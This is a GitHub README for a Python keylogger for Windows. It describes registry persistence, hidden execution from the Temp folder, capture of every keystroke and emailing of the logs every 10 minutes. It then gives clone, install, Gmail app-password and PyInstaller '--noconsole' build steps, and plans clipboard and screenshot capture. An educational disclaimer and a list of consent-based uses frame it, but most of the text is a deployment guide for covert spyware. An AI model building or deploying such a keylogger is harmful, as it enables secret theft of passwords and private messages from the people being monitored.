# Python Keylogger for Windows

Upon execution, the malware immediately initiates its process by adding itself to the Windows registry if not already present. It then changes its working directory to the system's temporary folder (`Temp`), an area often overlooked by regular users, granting the necessary permissions to execute its tasks without restrictions. This is crucial, as after each system reboot, the registry triggers the keylogger from the `System32` directory, which lacks write permissions for standard users. By operating from the `Temp` directory, the malware ensures it can create and modify log files without permission issues. The malware captures every keystroke, compiling detailed logs in a `.txt` file. Every 10 minutes, these logs are sent to a specified email address, after which the log file is cleared, maintaining a continuous and covert monitoring cycle.

### ⚠️ Disclaimer

This project is intended **exclusively for educational purposes**. It is designed to provide an understanding of how malware operates and interacts with operating system structures. This software should only be used in environments where all parties involved have granted explicit permission.

**Unauthorized use** of this software to monitor individuals without their knowledge and consent is illegal and unethical. The author does not endorse or condone any form of malicious activity. Users are responsible for ensuring they comply with all applicable laws and regulations in their jurisdiction.

### Getting started

#### System requirements
- MS Windows (tested on 10).
- [Python 3](https://www.python.org/downloads/) (tested on v. 3.12.5).

#### Usage

**1**
```
git clone https://github.com/szmpns/Keylogger.git
```
**2**
```
cd Keylogger
```
**3**
```
pip install -r requirements.txt
```
**4**
### Important: Configure Email Settings

Before running the project, make sure to fill in the following fields in the `send_email()` function:

```python
from_email = "" 
to_email = ""
password = ""
```

You should create a dedicated Gmail account for this purpose to handle email distribution. For detailed instructions, [click here](#configuring-gmail-smtp-settings) to learn how to enable SMTP and generate an app password.

**5**
```
python -m PyInstaller --onefile --noconsole --icon=icon.ico temp.py
```
**6**
```
cd dist
```

Keylogger is there, ready to use. 

> **Note **: The keylogger can also be used directly as a `.py` script, though this is not recommended. If you choose to run it this way, you can skip steps 5 and 6.

### Non-Malicious Uses of the Keylogger

This `.exe` file can be used in a variety of legitimate scenarios, including:

1. **Personal Productivity Monitoring**: Track your own typing habits to identify how much time you spend on specific tasks or applications, helping to improve productivity.
  
2. **Parental Control**: Monitor children's computer usage to ensure they are staying safe online, keeping track of their activity to protect them from inappropriate content or potential threats.

3. **Employee Productivity and Security Monitoring**: In a work environment(with employee consent), the keylogger can be used to track employee productivity and ensure safe usage of company resources. It can help identify any potentially dangerous or inappropriate activities, allowing administrators to intervene if necessary. For example, access to the computer can be temporarily blocked if certain prohibited actions are detected, until the incident is reviewed by an administrator.

4. **Data Recovery**: Recover unsaved or lost data in case of unexpected application crashes, power outages, or other interruptions, by keeping a record of recent keystrokes.

5. **Remote Learning Monitoring**: In online learning environments, monitor students' keyboard inputs during assessments to ensure they are not cheating, such as during coding exams or typing tests. This helps maintain academic integrity and allows for personalized feedback, always with the students' consent.

### Configuring Gmail SMTP Settings

If you want to use a Gmail account to send emails, follow these steps:

1. **Enable 2-Step Verification**:
   - Go to your [Google Account Security page](https://myaccount.google.com/security).
   - Under "Signing in to Google," click on **2-Step Verification** and follow the instructions to enable it.

2. **Create an App Password**:
   - Once 2-Step Verification is enabled, go to [this link](https://myaccount.google.com/apppasswords) and log in.
   - Enter a name for your app password(e.g., `Keylogger`) and click **Create**.
   - A 16-character app password will be shown. Copy this password.

3. **Update Your Code**:
   - Use this app password as the `password` in your `send_email()` function instead of your Gmail account password.

This will allow your script to send emails securely while keeping your Gmail account protected.

If you have any issues, check this guide: [Google Support](https://support.google.com/accounts/answer/185833?hl=en).

przyklady rozwoju dalszego wielkie jol pzdr

### Ideas for potential development

In the future I might come back to the project and develop it. Here are my ideas for features I could add:

1. **Encrypted Logs**: Implement encryption to ensure that logs remain secure while stored locally. They can only be decrypted after being sent via email, providing an extra layer of protection for sensitive data.

2. **Multi-Platform Support**: Expand compatibility to work seamlessly on other operating systems like macOS and Linux.

3. **Clipboard Monitoring**: Extend functionality to capture clipboard data, allowing the tracking of copy-paste actions, which can provide additional context for the logged keystrokes.

4. **Screenshot Capture**: Integrate periodic screenshot capturing to provide visual context of what the user is doing.

By using this project, you agree to take full responsibility for your actions and adhere strictly to legal and ethical standards.